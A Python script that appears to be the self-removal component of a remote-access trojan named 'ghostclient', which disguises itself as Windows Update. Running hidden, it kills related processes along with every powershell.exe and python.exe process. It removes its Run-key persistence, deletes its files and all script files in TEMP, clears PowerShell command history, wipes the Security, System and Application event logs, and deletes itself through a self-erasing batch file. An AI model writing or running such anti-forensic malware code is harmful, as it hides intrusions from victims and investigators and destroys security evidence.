import os
import subprocess
import winreg
import psutil
import time

def force_kill_socket_connections():
    try:
        cmd = 'netstat -n -p TCP | findstr "ESTABLISHED" > connections.txt'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        with open('connections.txt', 'r') as f:
            for line in f:
                if 'ESTABLISHED' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        local = parts[1]
                        port = local.split(':')[-1]
                        try:
                            subprocess.run(f'taskkill /F /PID {port}', 
                                         shell=True, 
                                         creationflags=subprocess.CREATE_NO_WINDOW)
                        except:
                            pass
        
        try:
            os.remove('connections.txt')
        except:
            pass
    except:
        pass

def kill_processes():
    try:
        # If you rename the ghostclient.py or ghostclient.exe, make sure to update the name here as well.
        process_names = ["WindowsUpdate.exe", "powershell.exe", "ghostclient.exe", "python.exe", "delete.exe"]
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if any(name.lower() in proc.info['name'].lower() for name in process_names):
                    proc.kill()
            except:
                pass
        
        for name in process_names:
            try:
                subprocess.run(f'taskkill /F /IM "{name}"', 
                             shell=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
                
        time.sleep(2)
    except:
        pass

def delete_registry_entries():
    try:
        registry_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
        ]
        
        value_names = ["Windows Security", "WindowsUpdate", "Microsoft Update"]
        
        for hkey, key_path in registry_locations:
            try:
                key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_ALL_ACCESS)
                for value_name in value_names:
                    try:
                        winreg.DeleteValue(key, value_name)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
    except:
        pass

def force_delete_file(file_path):
    try:
        try:
            os.remove(file_path)
            return
        except:
            pass
            
        try:
            subprocess.run(f'del /F /Q "{file_path}"', 
                         shell=True, 
                         creationflags=subprocess.CREATE_NO_WINDOW)
            return
        except:
            pass
            
        try:
            cmd = f'powershell "Remove-Item -Path \'{file_path}\' -Force -ErrorAction SilentlyContinue"'
            subprocess.run(cmd, 
                         shell=True, 
                         creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    except:
        pass

def delete_files():
    try:
        files_to_delete = [
            # Fichier marqueur
            os.path.join(os.getenv('APPDATA'), '.windows_update_marker'),
            
            os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.exe"),
            # If you rename the ghostclient.py or ghostclient.exe, make sure to update the name here as well.
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "ghostclient.exe"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "delete.exe"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "ghostclient.py"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "delete.py"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "cleanup.bat"),
        ]
        
        for file_path in files_to_delete:
            if os.path.exists(file_path):
                force_delete_file(file_path)
                    
        temp_dir = os.getenv('TEMP')
        try:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.ps1') or file.endswith('.psm1') or file.endswith('.bat'):
                        force_delete_file(os.path.join(root, file))
        except:
            pass
    except:
        pass

def clear_command_history():
    try:
        commands = [
            'powershell "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue"',
            'powershell "Clear-History"',
            'powershell "[System.Diagnostics.Process]::Start(\'cmd\', \'/c del %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*.txt\')"'
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, 
                             shell=True, 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
    except:
        pass

def clear_windows_logs():
    try:
        log_commands = [
            'powershell "Clear-EventLog -LogName Application" -ErrorAction SilentlyContinue',
            'powershell "Clear-EventLog -LogName System" -ErrorAction SilentlyContinue',
            'powershell "Clear-EventLog -LogName Security" -ErrorAction SilentlyContinue',
            'powershell "Get-WmiObject Win32_NTLogEvent | Remove-WmiObject" -ErrorAction SilentlyContinue',
            'wevtutil cl System',
            'wevtutil cl Application',
            'wevtutil cl Security'
        ]
        
        for cmd in log_commands:
            try:
                subprocess.run(cmd, 
                             shell=True, 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
    except:
        pass

def delete_self():
    try:
        script_path = os.path.abspath(__file__)
        client_path = os.path.join(os.path.dirname(script_path), "ghostclient.py")
        delete_exe_path = os.path.join(os.path.dirname(script_path), "delete.exe")
        batch_path = os.path.join(os.path.dirname(script_path), "cleanup.bat")
        
        with open(batch_path, 'w') as f:
            f.write('@echo off\n')
            f.write('ping 127.0.0.1 -n 3 > nul\n')  # More reliable delay
            f.write('taskkill /F /IM "WindowsUpdate.exe" >nul 2>&1\n')
            f.write('taskkill /F /IM "ghostclient.exe" >nul 2>&1\n')
            f.write('taskkill /F /IM "delete.exe" >nul 2>&1\n')
            f.write(f'del /F /Q "{client_path}" >nul 2>&1\n')
            f.write(f'del /F /Q "{delete_exe_path}" >nul 2>&1\n')
            f.write(f'del /F /Q "{script_path}" >nul 2>&1\n')
            f.write('(goto) 2>nul & del "%~f0" >nul 2>&1\n')
        
        subprocess.Popen(
            ['cmd', '/c', 'start', '/MIN', 'cmd', '/c', batch_path], 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def main():
    force_kill_socket_connections()
    kill_processes()
    delete_registry_entries()
    delete_files()
    clear_command_history()
    delete_self() 
    clear_windows_logs()

if __name__ == "__main__":
    main()